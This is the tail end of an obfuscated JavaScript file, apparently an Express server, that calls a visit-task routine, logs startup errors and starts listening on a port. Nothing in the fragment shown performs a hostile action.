AddVisitTask();}catch(_0x29ecee){console[_0x319195(0xf2)]('Error\x20in\x20startserver:',_0x29ecee);}}startserver()[_0x5bca7b(0x124)](_0x2cedaf=>{const _0x4e3886=_0x5bca7b;console[_0x4e3886(0xf2)](_0x4e3886(0x120),_0x2cedaf);}),app['listen'](PORT,()=>console[_0x5bca7b(0x12b)](_0x5bca7b(0x153)+PORT+'!'));
